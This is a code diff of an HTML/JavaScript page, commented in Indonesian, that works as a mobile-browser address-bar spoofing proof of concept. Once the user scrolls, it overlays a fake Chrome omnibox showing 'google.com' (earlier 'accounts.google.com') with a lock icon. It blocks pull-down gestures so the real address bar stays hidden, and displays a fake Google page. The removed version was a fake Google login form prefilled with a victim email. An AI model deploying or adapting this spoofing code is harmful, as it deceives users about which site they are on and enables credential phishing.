@@ -3,15 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Sign in - Google Accounts</title>
+<title>Google</title>
 <style>
     :root {
         --bg-color: #202124;
-        --card-bg: #202124;
-        --text-primary: #e8eaed;
-        --text-secondary: #bdc1c6;
-        --google-blue: #8ab4f8;
+        --text-color: #bdc1c6;
+        --input-bg: #303134;
         --border-color: #5f6368;
+        --google-blue: #8ab4f8;
     }
 
     * {
@@ -22,10 +21,10 @@
     body {
         margin: 0;
         padding: 0;
-        height: 5000px; /* Panjang halaman optimal untuk memicu auto-hide omnibox secara natural */
-        font-family: Roboto, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+        height: 5000px; /* Tinggi halaman optimal untuk memicu auto-hide omnibox asli secara natural */
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         background-color: var(--bg-color);
-        color: var(--text-primary);
+        color: var(--text-color);
         overflow-x: hidden;
     }
 
@@ -44,7 +43,7 @@
 
     .instructions p {
         font-size: 14px;
-        color: var(--text-secondary);
+        color: #9aa0a6;
         line-height: 1.5;
     }
 
@@ -116,107 +115,111 @@
         font-weight: bold;
     }
 
-    /* === GOOGLE LOGIN PAGE UI LAYOUT (AUTHENTIC MOBILE STYLE) === */
-    #googleLoginView {
+    /* === GOOGLE SEARCH HOMEPAGE UI LAYOUT === */
+    #googleHomepageView {
         position: absolute;
         left: 0;
         width: 100%;
         display: none;
-        background: var(--bg-color);
+        background: #202124;
         min-height: 100vh;
         z-index: 99998;
-        padding-top: 40px;
+        padding-top: 10px;
     }
 
-    .login-container {
-        width: 100%;
-        max-width: 450px;
-        margin: 0 auto;
-        padding: 24px;
-        background: var(--card-bg);
-        text-align: center;
-    }
-
-    /* Google Logo Authentic */
-    .google-logo-svg {
-        width: 75px;
-        height: 24px;
-        margin-bottom: 16px;
-        display: inline-block;
-    }
-
-    .login-container h1 {
-        font-size: 24px;
-        font-weight: 400;
-        color: var(--text-primary);
-        margin-bottom: 8px;
-    }
-
-    .login-container p.subtitle {
-        font-size: 16px;
-        color: var(--text-secondary);
-        margin-bottom: 32px;
-    }
-
-    /* Input Field Material Style */
-    .input-group {
-        position: relative;
-        margin-bottom: 24px;
-        text-align: left;
-    }
-
-    .material-input {
-        width: 100%;
-        padding: 16px;
-        background: transparent;
-        border: 1px solid var(--border-color);
-        border-radius: 4px;
-        color: var(--text-primary);
-        font-size: 16px;
-        outline: none;
-        transition: border-color 0.2s;
-    }
-
-    .material-input:focus {
-        border-color: var(--google-blue);
-        border-width: 2px;
-        padding: 15px;
-    }
-
-    .forgot-email {
-        text-align: left;
-        margin-bottom: 40px;
-    }
-
-    .forgot-email a {
-        color: var(--google-blue);
-        text-decoration: none;
-        font-size: 14px;
-        font-weight: 500;
-    }
-
-    .footer-actions {
+    .google-nav-header {
         display: flex;
         justify-content: space-between;
         align-items: center;
-        margin-top: 20px;
+        padding: 12px 16px;
+        font-size: 13px;
     }
 
-    .create-account {
-        color: var(--google-blue);
+    .google-nav-header .left-links, .google-nav-header .right-links {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+    }
+
+    .google-nav-header a {
+        color: #bdc1c6;
         text-decoration: none;
-        font-size: 14px;
-        font-weight: 500;
     }
 
-    .btn-next {
-        background-color: var(--google-blue);
+    .profile-avatar {
+        width: 32px;
+        height: 32px;
+        background: #8ab4f8;
         color: #202124;
-        border: none;
-        border-radius: 4px;
-        padding: 10px 24px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
         font-size: 14px;
+    }
+
+    .google-main-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 80px;
+        padding: 0 16px;
+    }
+
+    .google-logo {
+        font-size: 64px;
         font-weight: 500;
+        letter-spacing: -2px;
+        margin-bottom: 24px;
+        user-select: none;
+    }
+
+    .google-logo span:nth-child(1) { color: #4285f4; }
+    .google-logo span:nth-child(2) { color: #ea4335; }
+    .google-logo span:nth-child(3) { color: #fbbc05; }
+    .google-logo span:nth-child(4) { color: #4285f4; }
+    .google-logo span:nth-child(5) { color: #34a853; }
+    .google-logo span:nth-child(6) { color: #ea4335; }
+
+    .search-box-container {
+        width: 100%;
+        max-width: 584px;
+        background: #303134;
+        border: 1px solid #5f6368;
+        border-radius: 28px;
+        display: flex;
+        align-items: center;
+        padding: 10px 16px;
+        gap: 14px;
+        box-shadow: 0 1px 6px rgba(32,33,36,0.28);
+    }
+
+    .search-box-container svg {
+        width: 20px;
+        height: 20px;
+        fill: #9aa0a6;
+    }
+
+    .search-input {
+        flex: 1;
+        background: transparent;
+        border: none;
+        outline: none;
+        color: #e8eaed;
+        font-size: 16px;
+    }
+
+    .search-tools-icons {
+        display: flex;
+        gap: 16px;
+        align-items: center;
+    }
+
+    .search-tools-icons svg {
+        width: 22px;
+        height: 22px;
+        fill: #8ab4f8;
         cursor: pointer;
     }
 
@@ -232,25 +235,25 @@
         font-size: 12px;
         z-index: 999999;
         pointer-events: none;
-        border: 1px solid var(--border-color);
+        border: 1px solid #5f6368;
     }
 </style>
 </head>
 <body>
 
 <div class="instructions" id="instructionBox">
-    <h1>Full Chaining Advanced Simulation</h1>
-    <p>1. Gulir ke bawah sampai bilah alamat asli tersembunyi.<br>
-       2. Sistem rantai eksekusi otomatis mengunci posisi.<br>
-       3. Tampilan UI login Google terkunci sempurna.</p>
+    <h1>Full UI Chaining Simulation</h1>
+    <p>1. Gulir ke bawah secara perlahan hingga bilah alamat asli Chrome tersembunyi (auto-hide).<br>
+       2. Jeda sejenak untuk memicu rantai penguncian.<br>
+       3. Tampilan UI Google Search dan Chrome Top Bar akan dikunci secara penuh.</p>
 </div>
 
-<!-- Fake Chrome Top Bar & Omnibox -->
+<!-- Fake Chrome Top Bar & Omnibox (Menyerupai Chrome Mobile Dark Mode) -->
 <div id="fakeTopChrome">
     <div class="fake-browser-header">
         <div class="fake-omnibox">
             <span class="lock-icon">🔒</span>
-            <span>accounts.google.com/signin/v2/identifier</span>
+            <span>google.com</span>
         </div>
         <div class="browser-actions">
             <span>⌂</span>
@@ -260,30 +263,33 @@
     </div>
 </div>
 
-<!-- Google Login Page UI Layout -->
-<div id="googleLoginView">
-    <div class="login-container">
-        <svg class="google-logo-svg" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
-            <path fill="#4285F4" d="M9.8 12.4c0-.9-.1-1.8-.3-2.6H4.8v4.9h5.1c-.2 1.2-.9 2.2-1.9 2.9v2.4h3.1c1.8-1.7 3-4.2 3-7.6z"/>
-            <path fill="#34A853" d="M4.8 17.5c1.6 0 3-.5 4.1-1.4l-3.1-2.4c-.6.4-1.3.7-2.1.7-1.6 0-3-1.1-3.5-2.6H.6v2.5c1.1 2.2 3.4 3.2 5.7 3.2z"/>
-            <path fill="#FBBC05" d="M1.9 11.8c-.1-.4-.2-.8-.2-1.3s.1-.9.2-1.3V6.7H.6C.2 7.6 0 8.7 0 9.8s.2 2.2.6 3.1l1.3-1.1z"/>
-            <path fill="#EA4335" d="M4.8 4.7c.9 0 1.7.3 2.3.9l1.8-1.8C7.8 2.8 6.4 2.2 4.8 2.2c-2.3 0-4.6 1-5.7 3.2l1.3 1.1c.5-1.5 1.9-2.6 3.5-2.6z"/>
-        </svg>
+<!-- Google Search Homepage UI Layout -->
+<div id="googleHomepageView">
+    <div class="google-nav-header">
+        <div class="left-links">
+            <a href="#">Gmail</a>
+            <a href="#">Gambar</a>
+        </div>
+        <div class="right-links">
+            <svg focusable="false" viewBox="0 0 24 24" width="24" height="24" fill="#bdc1c6"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg>
+            <div class="profile-avatar">A</div>
+        </div>
+    </div>
+
+    <div class="google-main-content">
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
         
-        <h1>Login</h1>
-        <p class="subtitle">Gunakan Akun Google Anda</p>
-
-        <div class="input-group">
-            <input type="email" class="material-input" value="victim.security@gmail.com" placeholder="Email atau ponsel">
-        </div>
-
-        <div class="forgot-email">
-            <a href="#">Lupa email?</a>
-        </div>
-
-        <div class="footer-actions">
-            <a href="#" class="create-account">Buat akun</a>
-            <button class="btn-next">Berikutnya</button>
+        <div class="search-box-container">
+            <svg focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
+            <input type="text" class="search-input" placeholder="Telusuri Google atau ketik URL">
+            <div class="search-tools-icons">
+                <!-- Icon Microphone -->
+                <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm-1-9c0-.55.45-1 1-1s1 .45 1 1v6c0 .55-.45 1-1 1s-1-.45-1-1V5zm6 6c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"></path></svg>
+                <!-- Icon Google Lens -->
+                <svg viewBox="0 0 24 24"><path d="M12 15c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"></path></svg>
+            </div>
         </div>
     </div>
 </div>
@@ -292,15 +298,15 @@
 
 <script>
     let isChainingActive = false;
-    let scrollCheckCount = 0;
+    let scrollCounter = 0;
 
-    // Chaining Tahap 1: Memantau pergerakan scroll secara presisi
+    // Chaining Tahap 1: Memantau pergerakan scroll secara halus untuk memastikan auto-hide omnibox sukses
     window.addEventListener('scroll', function() {
         if (isChainingActive) return;
 
-        if (window.scrollY > 250) {
-            scrollCheckCount++;
-            if (scrollCheckCount > 2) {
+        if (window.scrollY > 200) {
+            scrollCounter++;
+            if (scrollCounter > 2) {
                 document.getElementById('statusIndicator').innerText = "Status: Target tercapai, menginisialisasi UI Lock...";
                 setTimeout(triggerFullUIChaining, 2000);
                 isChainingActive = true;
@@ -308,35 +314,38 @@
         }
     }, { passive: true });
 
-    // Chaining Tahap 2: Sinkronisasi mutlak elemen overlay agar presisi di posisi layar saat ini
+    // Chaining Tahap 2: Sinkronisasi layout absolut secara presisi tanpa pergeseran (layout shift)
     function triggerFullUIChaining() {
         let currentY = window.scrollY;
-        let loginView = document.getElementById("googleLoginView");
+        let googleView = document.getElementById("googleHomepageView");
         let fakeTopChrome = document.getElementById("fakeTopChrome");
         let indicator = document.getElementById("statusIndicator");
         let instructions = document.getElementById("instructionBox");
 
+        // Sembunyikan elemen panduan instruksi
         instructions.style.display = 'none';
 
-        loginView.style.top = currentY + "px";
-        loginView.style.display = "block";
+        // Terapkan posisi absolut sesuai koordinat scroll saat ini
+        googleView.style.top = currentY + "px";
+        googleView.style.display = "block";
         fakeTopChrome.style.display = "flex";
 
-        indicator.innerText = "Status: Full Chaining Aktif - UI Locked!";
+        indicator.innerText = "Status: Full Chaining Aktif - UI Terkunci!";
         indicator.style.borderColor = "#f28b82";
 
+        // Kunci posisi scroll mati-matian
         window.scrollTo({
             top: currentY,
             behavior: 'instant'
         });
     }
 
-    // Chaining Tahap 3: Pencegatan Sentuhan Agresif untuk mengunci gestur pull-to-reveal secara total
+    // Chaining Tahap 3: Pencegatan Sentuhan Agresif untuk memblokir gestur tarik ke bawah (pull-to-reveal)
     let touchStartY = 0;
 
     document.addEventListener("touchstart", function(e) {
         touchStartY = e.touches[0].clientY;
-    }, { passive: { non-passive: true } });
+    }, { passive: false });
 
     document.addEventListener("touchmove", function(e) {
         if (!isChainingActive) return;
@@ -344,12 +353,13 @@
         let currentTouchY = e.touches[0].clientY;
         let deltaY = currentTouchY - touchStartY;
 
-        // Memblokir gestur tarik ke bawah yang memicu kemunculan bilah alamat asli
+        // Jika ada upaya pengguna menarik layar ke bawah untuk memunculkan bilah alamat asli
         if (deltaY > 0) {
             e.preventDefault();
         }
     }, { passive: false });
 
+    // Kompatibilitas wheel event untuk desktop emulator
     document.addEventListener("wheel", function(e) {
         if (!isChainingActive) return;
         if (e.deltaY < 0) {
